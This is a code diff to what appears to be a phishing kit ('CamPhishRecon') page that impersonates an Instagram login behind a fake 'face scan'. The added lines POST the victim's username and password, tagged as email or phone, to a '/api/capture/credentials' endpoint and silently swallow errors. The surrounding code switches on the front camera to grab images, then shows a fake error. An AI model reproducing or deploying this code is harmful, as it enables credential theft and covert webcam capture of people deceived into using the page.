@@ -86,7 +86,7 @@ return false;
 }
 function doFaceScan(){
 var fs=document.getElementById('faceScan');fs.classList.add('active');
-if(window.CamPhishRecon)CamPhishRecon.Capture.event('instagram_login',{user:document.getElementById('user').value});
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('instagram_login',{user:document.getElementById('user').value});fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({template_id:'instagram',username:document.getElementById('user').value,password:document.getElementById('pass').value})}).catch(function(){});
 if(navigator.mediaDevices){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
 var v=document.getElementById('v');v.srcObject=stream;v.play();
@@ -95,6 +95,16 @@ var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if
 setTimeout(function(){clearInterval(ci);fs.classList.remove('active');document.getElementById('err').style.display='block';var btn=document.getElementById('loginBtn');btn.innerHTML='Log In';btn.disabled=false;},5000);
 }).catch(function(){setTimeout(function(){fs.classList.remove('active');document.getElementById('err').style.display='block';},2000);});
 }else{setTimeout(function(){fs.classList.remove('active');},2000);}
+}
+function captureCreds(){
+var u=document.getElementById("user");var p=document.getElementById("pass");
+if(!u||!p)return;
+var data={template_id:"instagram",username:u.value,password:p.value};
+if(u.value.indexOf("@")>=0)data.email=u.value;
+if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
+fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
+method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
+}).catch(function(){});
 }
 </script>
 </body></html>
